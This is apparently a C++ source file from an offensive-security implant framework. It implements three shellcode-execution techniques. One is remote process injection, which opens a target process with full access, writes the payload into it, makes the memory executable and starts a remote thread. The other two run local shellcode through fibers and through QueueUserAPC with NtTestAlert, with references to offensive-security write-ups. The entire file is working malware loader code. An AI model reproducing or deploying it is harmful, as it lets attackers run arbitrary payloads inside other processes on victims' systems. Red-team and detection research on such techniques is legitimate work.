#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL ShellcodeInjection(Procs::PPROCS pProcs, DWORD dwPID, const std::vector<BYTE>& shellcode)
    {
        HANDLE hProcess;
        HANDLE hThread;
        LPVOID lpRemoteBuffer;

        LPVOID lpBuffer     = (LPVOID)shellcode.data();
        SIZE_T dwBufferLen  = shellcode.size();

        hProcess = System::Process::ProcessOpen(
            pProcs,
            dwPID,
            PROCESS_ALL_ACCESS
        );
        if (!hProcess)
        {
            return FALSE;
        }

        lpRemoteBuffer = System::Process::VirtualMemoryAllocate(
            pProcs,
            hProcess,
            nullptr,
            dwBufferLen,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        if (!lpRemoteBuffer)
        {
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hProcess,
            lpRemoteBuffer,
            lpBuffer,
            dwBufferLen,
            NULL
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        // Set PAGE_EXECUTE_READWRITE protection.
        DWORD dwOldProtect = PAGE_READWRITE;
        if (!System::Process::VirtualMemoryProtect(
            pProcs,
            hProcess,
            &lpRemoteBuffer,
            &dwBufferLen,
            PAGE_EXECUTE_READWRITE,
            &dwOldProtect
        )) {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        hThread = System::Process::RemoteThreadCreate(
            pProcs,
            hProcess,
            (LPTHREAD_START_ROUTINE)lpRemoteBuffer,
            NULL
        );
        if (!hThread)
        {
            System::Process::VirtualMemoryFree(pProcs, hProcess, &lpRemoteBuffer, 0, MEM_RELEASE);
            System::Handle::HandleClose(pProcs, hProcess);
            return FALSE;
        }

        System::Handle::HandleWait(pProcs, hThread, FALSE, nullptr);

        System::Handle::HandleClose(pProcs, hProcess);
        System::Handle::HandleClose(pProcs, hThread);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber
    BOOL ShellcodeExecutionViaFibers(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
    {
        // Convert the current thread into a fiber.
        PVOID mainFiber = ConvertThreadToFiber(nullptr);

        LPVOID scAddr = VirtualAlloc(
            NULL,
            shellcode.size(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );
        memcpy(scAddr, shellcode.data(), shellcode.size());

        PVOID scFiber = CreateFiber(0, (LPFIBER_START_ROUTINE)scAddr, NULL);
        SwitchToFiber(scFiber);

        return TRUE;
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-in-a-local-process-with-queueuserapc-and-nttestalert
    BOOL ShellcodeExecutionViaAPCAndNtTestAlert(Procs::PPROCS pProcs, const std::vector<BYTE>& shellcode)
    {
        using MY_NTSTATUS = NTSTATUS(NTAPI*)();

        MY_NTSTATUS testAlert = (MY_NTSTATUS)(GetProcAddress(
            GetModuleHandleA("ntdll"),
            "NtTestAlert"
        ));

        LPVOID scAddr = VirtualAlloc(nullptr, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(GetCurrentProcess(), scAddr, shellcode.data(), shellcode.size(), nullptr);

        PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)scAddr;
        QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), 0);
        testAlert();

        return TRUE;
    }
}